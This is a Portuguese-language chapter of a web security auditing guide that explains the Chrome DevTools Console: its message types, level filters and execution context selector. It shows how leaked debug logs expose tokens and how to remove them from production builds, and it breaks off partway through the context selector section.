> [⬅️ 2.2 Chrome DevTools — Aba Application](./02b-devtools-application.md) | [🏠 **Voltar ao Sumário Principal**](../README.md) | [3A. Vulnerabilidades Web (3.0 a 3.9) ➡️](./03a-vulnerabilidades-parte1.md)

---

<a id="s2-3"></a>
### 2.3 Console

A aba **Console** do Chrome DevTools (ferramentas de desenvolvimento do navegador Google Chrome) é um dos ambientes mais versáteis e críticos tanto para o desenvolvimento e depuração de software quanto para a auditoria de segurança de aplicações web. Diferentemente das abas [Network](./02a-devtools-network.md#s2-1) (focada no tráfego de rede) e [Application](./02b-devtools-application.md#s2-2) (focada no estado e armazenamento no cliente), o Console atua simultaneamente em duas frentes complementares:

1. **Visualizador centralizado de registros (*Log Viewer*) e diagnósticos do navegador**: agrega todas as mensagens emitidas explicitamente pelo código JavaScript da aplicação (por meio da Console API — *Application Programming Interface*, ou Interface de Programação de Aplicações — padronizada pelo WHATWG, o *Web Hypertext Application Technology Working Group*) e os alertas internos gerados pelo próprio motor do navegador (V8 e Blink). Isso inclui exceções JavaScript não tratadas, falhas de carregamento de rede, bloqueios de CORS (*Cross-Origin Resource Sharing* — compartilhamento de recursos entre origens diferentes), violações de CSP (*Content Security Policy* — política de segurança de conteúdo), avisos de depreciação de APIs e alertas de segurança.
2. **Ambiente REPL interativo (*Read-Eval-Print Loop* — laço de leitura, avaliação e impressão)**: oferece um terminal de linha de comando JavaScript conectado diretamente ao contexto de execução da página ativa (`window` principal, `<iframe>`, *Web Worker* ou *Service Worker*). Nele, o desenvolvedor ou auditor pode ler uma expressão (*Read*), avaliá-la em tempo real no motor JavaScript (*Eval*), imprimir o resultado formatado no painel (*Print*) e repetir o ciclo continuamente (*Loop*).

##### Formas de abertura e posicionamento do Console

O Console pode ser aberto de duas maneiras principais no Chrome DevTools:
- **Como painel principal (aba Console)**: pressionando o atalho direto `Ctrl + Shift + J` (Windows/Linux) ou `Cmd + Option + J` (macOS), ou abrindo o DevTools (`F12`) e clicando na aba **Console** na barra superior.
- **Como gaveta inferior (*Console Drawer*)**: pressionando a tecla `Esc` enquanto estiver em qualquer outra aba do DevTools (como *Elements*, *Network* ou *Application*). Esse modo divide a janela do DevTools e mantém o Console visível na parte inferior, permitindo, por exemplo, editar o DOM (*Document Object Model* — Modelo de Objeto de Documento) na aba *Elements* ou monitorar requisições na aba *Network* enquanto se executam comandos JavaScript e se observam erros em tempo real.

##### Anatomia da interface da aba Console

A interface da aba Console é dividida em quatro regiões funcionais:

```text
+-----------------------------------------------------------------------------------+
| [Sidebar] [Clear] [Live Expr] | top v | Filter [          ] | Default levels v |⚙|
+-------------------------------+-------+---------------------+------------------+--+
| All messages     | > [Info] Aplicação inicializada em 142ms           app.js:18   |
|   14 Messages    | ! [Warn] Deprecation warning: recurso X obsoleto   vendor.js:4 |
|   1 User message | x [Error] Uncaught TypeError: user is null         auth.js:89  |
|   2 Errors       | > fetch('/api/perfil').then(r => r.json())                     |
|   1 Warning      | < Promise {<pending>}                                          |
|   10 Info        | > _                                                            |
|   0 Verbose      |                                                                |
+------------------+----------------------------------------------------------------+
```

1. **Barra de ação e filtros (topo)**: contém o botão de alternância da barra lateral (*Console Sidebar*), o botão de limpar o console (*Clear console*), o botão de criação de expressão ao vivo (*Create live expression*), o seletor de contexto de execução (*Execution context*, como `top`), a caixa de filtro textual/expressão regular (*Filter*), o menu suspenso de níveis de severidade (*Log levels*) e o ícone de engrenagem das configurações do Console (*Console settings*).
2. **Barra lateral do Console (*Console Sidebar*, recolhida por padrão)**: agrupa as mensagens por categoria (*All messages*, *User messages*, *Errors*, *Warnings*, *Info*, *Verbose*) e permite filtrar rapidamente mensagens geradas pelo script do usuário versus mensagens geradas pelo navegador.
3. **Área de exibição de mensagens (*Viewport de Logs*)**: lista cronológica de registros, cada um acompanhado de coloração semântica, ícone de severidade, contador de repetições (quando agrupadas), pilha de chamadas (*stack trace*) expansível e link clicável à direita apontando exatamente para o arquivo e linha de código que originou a mensagem (ex.: `auth.js:89`).
4. **Prompt de avaliação interativa (parte inferior, indicado pelo símbolo `>`)**: área de entrada de código JavaScript com preenchimento automático (*autocompletion*), avaliação antecipada (*eager evaluation*), histórico de comandos (setas `↑` e `↓`) e suporte a múltiplas linhas (`Shift + Enter`). O valor retornado pela última expressão avaliada é exibido logo abaixo com o símbolo `<-` (ou `<`).

> [!TIP]
> **Console vs. Aba Issues**: Nas versões modernas do Chrome (`**[Varia por versão]**`), muitos avisos arquiteturais, de segurança e de compatibilidade — como cookies bloqueados por `SameSite`, problemas de CORS, conteúdo misto (*Mixed Content*) e dicas de acessibilidade — foram migrados ou espelhados na aba **Issues** (ícone de balão de fala com contador ao lado da engrenagem de configurações) para reduzir a poluição visual do Console. Sempre audite a aba *Console* em conjunto com a aba *Issues*.

---

<a id="s2-3-1"></a>
#### 2.3.1 Tipos de mensagens no Console

As mensagens exibidas no Console são classificadas de acordo com sua origem e seu **nível de severidade (*log level*)**. Compreender a diferença técnica entre os métodos de emissão (`console.log`, `console.info`, `console.debug`, `console.warn`, `console.error`) e os quatro níveis de filtragem do navegador (*Info*, *Warnings*, *Errors*, *Verbose*) é essencial para não perder evidências durante uma investigação de segurança ou resolução de problemas (*troubleshooting*).

A tabela a seguir resume o mapeamento entre o tipo de mensagem, os métodos que a produzem, a apresentação visual e o nível de filtro correspondente no Chrome DevTools:

| Tipo de Mensagem | Método(s) da API / Origem | Nível de Filtro no Chrome | Cor / Destaque Visual | Finalidade Principal |
| :--- | :--- | :--- | :--- | :--- |
| **Log** | `console.log()`, `console.dir()`, `console.table()`, `console.group()` | **Info** | Texto padrão (preto no tema claro / branco no escuro), sem ícone | Saída geral de valores, objetos e fluxo de execução. |
| **Info** | `console.info()`, avisos informativos do navegador | **Info** | Texto padrão (em alguns navegadores/versões com ícone `i`) | Marcos informativos de estado do sistema ou ciclo de vida. |
| **Debug** | `console.debug()`, `console.timeEnd()` | **Verbose** | Texto azulado ou acinzentado discreto | Diagnóstico detalhado de baixo nível (oculto por padrão se *Verbose* estiver desmarcado). |
| **Warning** | `console.warn()`, alertas de depreciação e políticas em modo *report* | **Warnings** | Fundo amarelo-claro / âmbar, ícone de triângulo de exclamação `⚠️` | Situações anômalas não fatais, APIs obsoletas ou práticas arriscadas. |
| **Error** | `console.error()`, `console.assert()`, exceções não tratadas, falhas HTTP/CORS/CSP | **Errors** | Fundo vermelho-claro / rosado, ícone de círculo com `❌` e *stack trace* | Falhas críticas de execução, exceções lançadas e bloqueios de segurança. |
| **Verbose** | Categoria de filtro que engloba `console.debug()` e diagnósticos internos do Chrome (ex.: `[Violation]`) | **Verbose** | Texto discreto, frequentemente prefixado por `[Violation]` | Telemetria fina de desempenho, *handlers* lentos e depuração profunda. |

A seguir, cada um dos seis tipos de mensagens é analisado detalhadamente segundo a ficha técnica de 10 pontos.

##### Log

1. **Nome do parâmetro**: **Log** (Mensagem de registro padrão).
2. **O que significa**: É a mensagem de saída padrão emitida pela aplicação web por meio de chamadas explícitas a `console.log()` (e métodos correlatos de formatação como `console.table()`, `console.dir()` e `console.count()`). Não possui conotação de erro nem de alerta.
3. **Para que serve**: Serve para inspecionar o valor de variáveis, acompanhar o fluxo de execução de funções, verificar o retorno de chamadas assíncronas durante o desenvolvimento e registrar eventos genéricos no cliente.
4. **Onde encontrar no DevTools**: Na área principal da aba **Console**, visível quando o nível de filtro **Info** está habilitado no menu suspenso *Default levels*, ou na barra lateral do Console em **User messages** / **Info**.
5. **Exemplo prático**:
   ```javascript
   // Em um script da aplicação (carrinho.js:24)
   const resumoPedido = { pedidoId: 9042, itens: 3, moeda: "BRL", total: 249.90 };
   console.log("Resumo do carrinho calculado:", resumoPedido);
   ```
   No Console, será exibida a linha `Resumo do carrinho calculado: ▶ {pedidoId: 9042, itens: 3, moeda: 'BRL', total: 249.9}` com uma seta expansível para inspecionar as propriedades do objeto e a referência `carrinho.js:24` à direita.
6. **Comportamento normal**: Durante o desenvolvimento local (`localhost`), é normal observar diversas mensagens de `Log` auxiliando o programador. Em ambientes de **produção**, o comportamento normal e esperado é que haja **pouquíssimas ou nenhuma** mensagem de `Log` gerada pela aplicação.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Em produção, o Console deve estar livre de logs de depuração da lógica de negócios. Caso alguma mensagem seja mantida (como um aviso institucional ou versão pública do *build*), ela jamais deve conter dados de usuários, estrutura de banco de dados ou chaves de configuração.
8. **O que poderia indicar uma vulnerabilidade**: Desenvolvedores frequentemente esquecem chamadas `console.log(usuario)`, `console.log(tokenJWT)`, `console.log(respostaAPI)` ou `console.log(senha)` no código que vai para produção. Isso caracteriza **exposição de informações sensíveis no cliente**, permitindo que qualquer pessoa com acesso físico temporário à máquina desbloqueada, uma extensão maliciosa ou um script injetado entenda detalhes internos da arquitetura e capture dados confidenciais (PII — *Personally Identifiable Information*, ou Informações Pessoais Identificáveis).
9. **Como investigar o problema**: Abra a aba **Console**, ative a opção **Preserve log** (para não perder mensagens durante redirecionamentos de login), abra a **Console Sidebar** e clique em **User messages** (mensagens geradas exclusivamente pelo código da página). Navegue pelos fluxos críticos (login, cadastro, checkout, alteração de senha) e procure objetos JSON (*JavaScript Object Notation*) expandidos ou strings contendo termos como `token`, `Bearer`, `password`, `cpf`, `secret` ou `key`. Clique no link `arquivo.js:linha` à direita para abrir o código-fonte exato na aba *Sources*.
10. **Como corrigir ou prevenir**: **`[RECOMENDAÇÃO]`** Configure o empacotador (*bundler*) de produção (como Webpack/Terser, Vite/Esbuild ou Rollup) para remover automaticamente chamadas `console.log` durante o *build* de produção (por exemplo, `drop_console: true` no Terser ou `esbuild.drop: ['console']` no Vite), e utilize regras de *linter* (ESLint com a regra `no-console: ["error", { allow: ["warn", "error"] }]`) no pipeline de integração contínua (CI/CD — *Continuous Integration / Continuous Deployment*).

##### Info

1. **Nome do parâmetro**: **Info** (Mensagem informativa / Nível de filtro *Info*).
2. **O que significa**: Representa mensagens de caráter puramente informativo sobre marcos do ciclo de vida da aplicação (emitidas via `console.info()`) ou notificações neutras do navegador. No filtro do Chrome DevTools, o nível **Info** agrupa tanto as chamadas `console.info()` quanto `console.log()`.
3. **Para que serve**: Serve para comunicar eventos significativos de estado — como inicialização de módulos, conexão bem-sucedida a um servidor WebSocket ou ativação de um *Service Worker* — separando semanticamente essas notificações no código-fonte das depurações temporárias feitas com `console.log()`.
4. **Onde encontrar no DevTools**: Na listagem principal da aba **Console** (quando o checkbox **Info** está marcado no menu de níveis) e na categoria **Info** da barra lateral (*Console Sidebar*).
5. **Exemplo prático**:
   ```javascript
   // Em sw-register.js:12
   console.info("[App] Service Worker registrado no escopo:", registration.scope);
   ```
   No Console, aparece `[App] Service Worker registrado no escopo: https://loja-ficticia.test/` apontando para `sw-register.js:12`.
6. **Comportamento normal**: Aplicações baseadas em frameworks modernos (React, Angular, Vue) ou PWAs (*Progressive Web Apps* — Aplicações Web Progressivas) costumam emitir uma ou duas mensagens `Info` na inicialização em ambiente de homologação (ex.: informando que o modo de desenvolvimento do framework está ativo).
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Mensagens informativas em produção, se existirem, devem ser genéricas e não revelar versões exatas de bibliotecas internas vulneráveis, URLs de servidores de homologação (*staging*) ou chaves de clientes de monitoramento.
8. **O que poderia indicar uma vulnerabilidade**: Mensagens `Info` que anunciam detalhes de infraestrutura interna (ex.: `[Info] Conectado ao cluster Redis interno 10.24.0.15:6379 via proxy de desenvolvimento` ou `[Info] React DevTools: Running in development build v18.x.x`), indicando que o pacote (*bundle*) enviado ao servidor de produção foi compilado em modo de desenvolvimento (*development mode*), o que expõe nomes originais de componentes, mapas de código (*source maps*) e verificações internas desnecessárias.
9. **Como investigar o problema**: Na barra lateral do Console, selecione **Info** e recarregue a página (`Ctrl + R`). Verifique se bibliotecas de terceiros ou o código próprio imprimem banners de inicialização revelando versões exatas de dependências, endpoints de APIs administrativas ou flags de ambiente (`ENV=staging`, `DEBUG=true`).
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Garanta que variáveis de ambiente de compilação (`NODE_ENV=production`) estejam corretamente definidas ao gerar os artefatos de produção, desabilitando banners de diagnóstico de frameworks e substituindo logs informativos detalhados por telemetria silenciosa no servidor quando necessário.

##### Debug

1. **Nome do parâmetro**: **Debug** (Mensagem de depuração detalhada).
2. **O que significa**: São mensagens de diagnóstico de baixo nível emitidas pelo método `console.debug()` (ou por contadores de tempo como `console.timeEnd()`). No Chrome DevTools, essas mensagens são classificadas sob o nível de severidade **Verbose** e, por padrão, **ficam ocultas** até que o usuário habilite explicitamente esse nível.
3. **Para que serve**: Serve para registrar rastreamentos granulares de algoritmos, estados intermediários de máquinas de estado (ex.: Redux, Pinia), tempos de renderização ou payloads de sincronização que poluiriam a visualização padrão do Console se fossem emitidos com `console.log()`.
4. **Onde encontrar no DevTools**: Na aba **Console**, mas **somente** após abrir o menu suspenso **Default levels** (no topo à direita) e marcar a caixa de seleção **Verbose** (ou selecionar **Verbose** na barra lateral do Console).
5. **Exemplo prático**:
   ```javascript
   // Em auth-interceptor.js:45
   console.debug("[AuthDebug] Renovando access_token silenciosamente. Payload decodificado:", claims);
   ```
   Com os filtros padrão (*Default levels*), nada aparece no Console. Ao ativar o nível **Verbose**, a linha surge em tom azul/acinzentado revelando o objeto `claims`.
6. **Comportamento normal**: É comum bibliotecas de telemetria, SDKs (*Software Development Kits* — kits de desenvolvimento de software) de autenticação ou players de vídeo emitirem mensagens `console.debug()` quando configurados com `debug: true`, permanecendo invisíveis na visualização padrão do navegador.
7. **O que seria considerado seguro**: **`[RECOMENDAÇÃO]`** Nenhuma rotina de `console.debug()` contendo estados de autenticação, chaves criptográficas, dados pessoais ou parâmetros internos de consultas deve permanecer ativa no código distribuído ao cliente final.
8. **O que poderia indicar uma vulnerabilidade**: Muitos desenvolvedores acreditam erroneamente que `console.debug()` "só funciona em ambiente de desenvolvimento" ou que não pode ser visto por usuários comuns por não aparecer na configuração padrão do Console. Como resultado, deixam tokens de acesso, chaves de criptografia simétrica do cliente, respostas brutas de GraphQL/REST e estados completos da sessão sendo despejados via `console.debug()`. Basta um atacante ou auditor marcar o checkbox **Verbose** para visualizar todo esse fluxo oculto.
9. **Como investigar o problema**: Durante qualquer auditoria na aba Console, o primeiro passo obrigatório é clicar em **Default levels** e **marcar a opção Verbose**. Em seguida, clique na categoria **Verbose** na barra lateral do Console para isolar exclusivamente as mensagens de `console.debug()` e avisos internos do navegador, inspecionando cada objeto registrado.
10. **Como corrigir ou prevenir**: **`[RECOMENDAÇÃO]`** Nunca utilize `console.debug()` como mecanismo de "ocultação" de logs em produção. Remova todas as chamadas `console.debug` no *build* de produção ou condicione sua compilação a variáveis estáticas eliminadas por *tree-shaking* (*dead-code elimination* — eliminação de código morto), como `if (import.meta.env.DEV) { console.debug(...); }`.

##### Warning

1. **Nome do parâmetro**: **Warning** (Aviso / Alerta não fatal).
2. **O que significa**: É uma mensagem de alerta que sinaliza uma condição potencialmente problemática, um risco de segurança iminente, uma violação de política em modo de teste (*Report-Only*) ou o uso de um recurso obsoleto (*deprecated*), mas que **não interrompe** imediatamente a execução do script atual. Pode ser emitida pelo desenvolvedor (`console.warn()`) ou pelo próprio motor do navegador.
3. **Para que serve**: Serve para alertar desenvolvedores e auditores sobre más práticas, incompatibilidades futuras do navegador, carregamento passivo de recursos inseguros (*Mixed Content* atualizável), problemas de atributos de cookies ou falhas não críticas tratadas em blocos `catch`.
4. **Onde encontrar no DevTools**: Na aba **Console**, destacada com **fundo amarelo/âmbar** e ícone de triângulo de exclamação `⚠️`. Também aparece contabilizada no topo direito do DevTools (ao lado do ícone de erros) e filtrável em **Warnings** na barra lateral.
5. **Exemplo prático**:
   ```javascript
   // Emitido pelo código da aplicação (api-client.js:78)
   if ( window.location.protocol !== "https:" ) {
     console.warn("Atenção: Conexão sem TLS detectada. Credenciais não devem ser trafegadas.");
   }
   ```
   Ou emitido nativamente pelo navegador:
   ```text
   ⚠️ Mixed Content: The page at 'https://loja-ficticia.test/' was loaded over HTTPS, but requested an insecure image 'http://cdn.loja-ficticia.test/banner.jpg'. This content should also be served over HTTPS.
   ```
6. **Comportamento normal**: Uma aplicação madura e bem mantida deve apresentar zero (ou quase zero) avisos em produção. Eventualmente, avisos de terceiros (como bibliotecas de anúncios ou avisos de depreciação de APIs do Chrome em transição) podem aparecer sem quebrar a página.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Ausência de avisos relacionados a segurança (como *Mixed Content*, cookies sem `SameSite` adequado, uso de `DOMNodeInserted` obsoleto ou cabeçalhos de segurança malformados).
8. **O que poderia indicar uma vulnerabilidade**: Avisos no Console são frequentemente a ponta do iceberg de vulnerabilidades reais:
   - Avisos de **Mixed Content** indicam que ativos da página estão sendo requisitados via HTTP sem criptografia, abrindo margem para interceptação e adulteração visual (*deface* parcial) na rede.
   - Avisos de **Cookie Sem Atributos Seguros** (ex.: `SameSite=None` sem `Secure`) revelam falhas na gestão de sessão.
   - Avisos de **`[Report Only] Refused to execute inline script...`** mostram que a aplicação possui scripts *inline* ou chamadas `eval()` que violariam uma política CSP ativa, evidenciando pontos frágeis contra XSS (*Cross-Site Scripting* — execução de scripts entre sítios).
   - Avisos gerados por frameworks (como o React alertando sobre `dangerouslySetInnerHTML` mal utilizado ou URLs com protocolo `javascript:`) apontam diretamente para vetores de injeção no DOM.
9. **Como investigar o problema**: Selecione a categoria **Warnings** na barra lateral do Console (ou desmarque *Info*, *Errors* e *Verbose* no menu *Levels*). Leia atentamente a mensagem do navegador, expanda a pilha de chamadas (*stack trace*) clicando na seta `▶` à esquerda do aviso e verifique qual script ou elemento HTML disparou a condição. Verifique também a aba **Issues** para obter a explicação detalhada do Chrome sobre aquele aviso.
10. **Como corrigir ou prevenir**: **`[RECOMENDAÇÃO]`** Trate avisos de segurança no Console com a mesma prioridade de erros em revisões de código. Migre todos os sub-recursos para `https://`, atualize bibliotecas que utilizam APIs obsoletas do DOM, ajuste os atributos de cookies no servidor e corrija violações apontadas por políticas `Content-Security-Policy-Report-Only` antes de promovê-las para bloqueio efetivo.

##### Error

1. **Nome do parâmetro**: **Error** (Erro crítico / Exceção / Bloqueio de segurança).
2. **O que significa**: É o nível mais severo de registro no Console. Representa uma falha na execução de um script (exceções síncronas não capturadas ou Promises rejeitadas sem tratamento), uma chamada explícita a `console.error()` ou `console.assert(false, ...)`, uma falha de rede (status HTTP `4xx` ou `5xx`) ou um **bloqueio ativo de segurança** imposto pelo navegador (como CORS, CSP, *Mixed Content* ativo ou *X-Frame-Options*).
3. **Para que serve**: Serve para expor imediatamente o ponto exato onde a execução falhou ou onde o navegador impediu uma operação proibida pelas políticas de segurança da web, fornecendo a mensagem descritiva do erro e o *stack trace* completo (sequência de funções chamadas até o ponto da falha).
4. **Onde encontrar no DevTools**: Na aba **Console**, destacado com **fundo vermelho/rosado** e ícone `❌`. O número total de erros acumulados também fica permanentemente visível no canto superior direito da janela do DevTools, mesmo quando você está em outras abas.
5. **Exemplo prático**:
   ```text
   ❌ Uncaught TypeError: Cannot read properties of undefined (reading 'isAdmin')
       at verificarPermissaoPainel (admin-guard.js:14:27)
       at HTMLButtonElement.<anonymous> (dashboard.js:52:9)
   ```
   Ou um erro de bloqueio de segurança gerado pelo navegador:
   ```text
   ❌ Refused to load the script 'https://script-externo.test/tracker.js' because it violates the following Content Security Policy directive: "script-src 'self'".
   ```
6. **Comportamento normal**: Em condições normais de uso, uma aplicação saudável não deve lançar exceções JavaScript não tratadas (`Uncaught ...`) nem sofrer bloqueios de CSP/CORS em suas próprias rotas legítimas. Erros HTTP `401 Unauthorized` ou `422 Unprocessable Content` podem aparecer pontualmente quando o usuário digita uma senha incorreta ou preenche um formulário inválido.
7. **O que seria considerado seguro**: **`[REQUISITO]`** Quando erros ocorrem, a aplicação deve capturá-los graciosamente (`try...catch` ou `.catch()`), exibir mensagens amigáveis e genéricas na interface do usuário e **nunca** despejar estruturas internas do servidor, consultas SQL (*Structured Query Language*) ou caminhos físicos de diretórios do back-end no Console.
8. **O que poderia indicar uma vulnerabilidade**:
   - **Exceções de cliente em verificações de segurança**: um erro como `Cannot read properties of null (reading 'role')` em `auth-guard.js` pode interromper o script que redirecionaria um usuário não autorizado para fora de uma página restrita, deixando a interface visível no cliente.
   - **Erros de sintaxe ou referência ao injetar dados**: ao testar inputs da aplicação em ambiente autorizado com caracteres especiais (`'`, `"`, `<`, `>`, `\`), o surgimento imediato de `Uncaught SyntaxError: Unexpected identifier` no Console é um fortíssimo indicador de **XSS baseado em DOM ou refletido dentro de uma tag `<script>`**, pois significa que a entrada do usuário escapou de uma string JavaScript e está sendo interpretada como código executável!
   - **Erros HTTP 500 acompanhados de payload de erro logado**: scripts que fazem `catch(err => console.error(err.response.data))` frequentemente imprimem no Console o *stack trace* completo do servidor (Java, Python, PHP, Node.js) retornado pela API.
9. **Como investigar o problema**: Filtre o Console por **Errors** na barra lateral. Clique na seta `▶` ao lado do ícone `❌` para expandir a pilha de chamadas (*stack trace*). Identifique a primeira linha do *stack trace* (onde o erro ocorreu) e as linhas subsequentes (quem chamou a função). Clique no link do arquivo (`admin-guard.js:14:27`) para abrir a aba **Sources** exatamente na linha problemática, inspecione o código ao redor e, se for uma falha de rede ou API, clique no link da URL para inspecionar a resposta completa na aba **Network**.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Implemente tratamento defensivo de erros (`try...catch`, *Optional Chaining* `usuario?.role`, *Error Boundaries* em frameworks de UI), valide e sanitize rigorosamente qualquer dado antes de interpolá-lo no DOM ou em contextos JavaScript, e configure o back-end para retornar apenas códigos de erro padronizados e mensagens genéricas ao cliente, mantendo os *stack traces* restritos aos logs internos do servidor.

##### Verbose

1. **Nome do parâmetro**: **Verbose** (Modo detalhado / Verborrágico).
2. **O que significa**: Não é um método isolado do objeto `console`, mas sim o **nível mais amplo e detalhado de classificação e filtragem** do Console do Chrome DevTools. Ele engloba todas as chamadas a `console.debug()` feitas pelo código da página e adiciona diagnósticos internos de baixo nível gerados pelo próprio motor Blink/V8 do navegador — especialmente os alertas de **`[Violation]`** de desempenho e ciclo de vida.
3. **Para que serve**: Serve para revelar eventos silenciosos que o navegador omite por padrão para não sobrecarregar o desenvolvedor: *event handlers* que bloqueiam a *thread* principal por muitos milissegundos, *timers* (`setTimeout`/`requestAnimationFrame`) lentos, *forced reflows* (recálculos forçados de layout), avisos detalhados de formulários HTML (como campos `<input type="password">` fora de um `<form>` ou sem atributo `autocomplete`) e logs emitidos via `console.debug()`.
4. **Onde encontrar no DevTools**: Na barra superior do Console, clicando no menu suspenso **Default levels** e marcando o checkbox **Verbose**. Após ativado, pode ser visualizado de forma isolada clicando em **Verbose** na barra lateral do Console (*Console Sidebar*).
5. **Exemplo prático**:
   Ao ativar o nível **Verbose** em uma página de login, o próprio Chrome pode exibir avisos internos de auditoria de DOM e performance:
   ```text
   [DOM] Input elements should have autocomplete attributes (suggested: "current-password"): (More info: https://goo.gl/9p2vKq)  <input type="password" name="senha">
   [Violation] 'click' handler took 384ms                                                                                          bundle.js:1402
   ```
6. **Comportamento normal**: É normal que aplicações complexas apresentem avisos ocasionais de `[Violation] 'requestAnimationFrame' handler took Xms` quando o nível *Verbose* está ativo, especialmente com o DevTools aberto (pois a própria instrumentação do DevTools adiciona sobrecarga de processamento).
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** No nível *Verbose*, os avisos `[DOM]` são excelentes aliados de segurança: um formulário seguro segue as recomendações de marcação semântica e atributos `autocomplete` (`username`, `current-password`, `new-password`, `one-time-code`) para permitir a integração correta e segura com gerenciadores de senhas, e não expõe dados sensíveis em chamadas `console.debug()`.
8. **O que poderia indicar uma vulnerabilidade**:
   - **Logs `console.debug()` esquecidos**: conforme detalhado no item *Debug*, segredos e tokens frequentemente aparecem apenas quando *Verbose* é ativado.
   - **Avisos `[DOM]` de campos de senha duplicados ou mal estruturados**: avisos como `[DOM] Found 2 elements with non-unique id #password` ou campos de senha sem formulário adequado podem indicar tanto falhas de qualidade quanto manipulações suspeitas de DOM (como injeção de formulários falsos para captura de credenciais — *Form Hijacking* / *Phishing* in-page via XSS).
   - **Violações severas e repetitivas de tempo de execução**: um loop ou *handler* consumindo centenas de milissegundos continuamente pode indicar desde um bug de código até a execução oculta de scripts abusivos (como *cryptojacking* ou exfiltração pesada de dados) ou vulnerabilidade a *ReDoS* (*Regular Expression Denial of Service* — negação de serviço por expressão regular no cliente).
9. **Como investigar o problema**: Habilite **Verbose** no menu *Levels* e selecione a categoria **Verbose** na barra lateral. Passe o mouse sobre os elementos HTML exibidos nas mensagens `[DOM]` para destacá-los diretamente na página renderizada, ou clique neles para inspecioná-los na aba *Elements*. Para mensagens `[Violation]`, clique no arquivo e linha indicados à direita para analisar a função lenta na aba *Sources* ou grave um perfil na aba *Performance*.
10. **Como corrigir ou prevenir**: **`[BOA PRÁTICA]`** Corrija as marcações HTML de formulários de autenticação apontadas pelos avisos `[DOM]` do modo *Verbose*, otimize funções bloqueantes na *thread* principal e garanta a remoção de chamadas `console.debug()` sensíveis antes da publicação em produção.

---

<a id="s2-3-2"></a>
#### 2.3.2 Recursos, controles e filtros da aba Console

Para auditar aplicações complexas que emitem centenas de eventos por segundo ou que utilizam múltiplos contextos de execução (como `<iframe>` de pagamento, *Service Workers* e extensões do navegador), é indispensável dominar os controles de filtragem, isolamento de contexto e configuração da aba Console.

A seguir, cada recurso, controle e filtro da aba Console é detalhado individualmente segundo a ficha técnica de 10 pontos.

##### Levels (Default levels: Verbose, Info, Warnings, Errors)

1. **Nome do parâmetro**: **Levels** / **Default levels** (Seletor de níveis de severidade: *Verbose*, *Info*, *Warnings*, *Errors*).
2. **O que significa**: É um menu suspenso de seleção múltipla que controla quais categorias de severidade de mensagens são renderizadas na área principal do Console. Por padrão (*Default levels*), os níveis **Info**, **Warnings** e **Errors** vêm marcados, enquanto **Verbose** vem desmarcado.
3. **Para que serve**: Serve para reduzir o ruído visual durante uma análise (por exemplo, exibindo apenas *Errors* ao depurar uma falha crítica) ou para expandir a visibilidade (habilitando *Verbose* para capturar logs de `console.debug()` e alertas `[Violation]` / `[DOM]`).
4. **Onde encontrar no DevTools**: Na barra de ferramentas superior da aba **Console**, à direita da caixa de texto *Filter*, exibido como **`Default levels ▼`** (quando na configuração padrão) ou **`Custom levels ▼`** (quando algum checkbox é alterado). Caso a barra lateral (*Console Sidebar*) esteja aberta, este menu suspenso fica desabilitado porque a filtragem por nível passa a ser controlada clicando nas categorias da própria barra lateral.
5. **Exemplo prático**:
   Ao auditar uma aplicação que imprime dezenas de avisos amarelos de bibliotecas antigas, o analista abre o menu **Default levels**, desmarca *Info* e *Warnings* e mantém apenas **Errors** marcado, isolando instantaneamente uma violação de CSP vermelha que estava escondida no meio da listagem. Em seguida, marca **Verbose** para verificar se há tokens sendo impressos via `console.debug()`.
6. **Comportamento normal**: O botão exibe `Default levels` (com *Info*, *Warnings* e *Errors* ativos). Se algum nível for ocultado e existirem mensagens naquele nível, o rótulo do botão indica quantas mensagens estão ocultas (ex.: `12 hidden`).
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Para o auditor ou desenvolvedor, a prática segura durante uma revisão de segurança é inspecionar a aplicação com **todos os quatro níveis marcados** (*Verbose*, *Info*, *Warnings*, *Errors*), garantindo que nenhum log de depuração oculto passe despercebido.
8. **O que poderia indicar uma vulnerabilidade**: Confiar apenas em *Default levels* durante um teste de segurança pode fazer o analista ignorar credenciais, chaves de API ou estados internos da sessão que foram registrados com `console.debug()` (nível *Verbose*) ou avisos críticos `[DOM]` sobre formulários de senha inseguros.
9. **Como investigar o problema**: Clique no menu suspenso **Default levels**, marque **Verbose** e observe se novas linhas surgem imediatamente no Console. Se o botão indicar `X hidden`, clique nele e reabilite todos os níveis para verificar o que estava sendo filtrado.
10. **Como corrigir ou prevenir**: **`[RECOMENDAÇÃO]`** Do lado da aplicação, remova todos os logs sensíveis independentemente do nível (`log`, `info`, `debug`, `warn`, `error`) antes do *deploy* em produção; do lado do auditor, inclua a ativação do nível *Verbose* como passo obrigatório no checklist de inspeção do navegador (veja a [Seção 6.3](./06-checklist-e-comparativo.md#s6-3)).

##### Context (Execution context selector — top, iframes, workers, extensões)

1. **Nome do parâmetro**: **Execution context selector** (Seletor de contexto de execução — `top`, iframes, workers e extensões).
2. **O que significa**: Cada documento HTML principal, cada `<iframe>` embutido, cada *Web Worker* / *Service Worker* e cada *Content Script* de extensão do navegador roda em seu próprio **contexto global de execução JavaScript** (seu próprio objeto `window` ou `self` isolado). O seletor de contexto define em qual desses ambientes os comandos digitados no REPL do Console serão avaliados.
3. **Para que serve**: Serve para alternar o alvo do terminal interativo do Console entre a página principal (`top`) e qualquer subcontexto ativo (como um `<iframe>` de checkout, um desafio CAPTCHA ou um *Service Worker*), permitindo inspecionar o `document`, `window`, variáveis locais e `localStorage` específicos daquele quadro ou *worker*.
4. **Onde encontrar no DevTools**: Na barra superior da aba **Console**, à esquerda da caixa *Filter*. Por padrão, exibe o valor **`top ▼`** (representando o frame principal da página).
5. **Exemplo prático**:
   Uma loja virtual (`https://loja-ficticia.test`) carrega um formulário de pagamento dentro de `<iframe name="checkout-frame" src="https://pagamentos.loja-ficticia.test/form">`.
   - Se o seletor estiver em **`top`** e você digitar `document.querySelector('#numero-cartao')`, o retorno será `null`, pois o elemento não pertence ao DOM principal.
   - Ao clicar em **`top ▼`** e selecionar **`checkout-frame (pagamentos.loja-ficticia.test)`**, o prompt do Console passa a ser executado dentro do iframe; digitar `window.origin` retornará `"https://pagamentos.loja-ficticia.test"`.
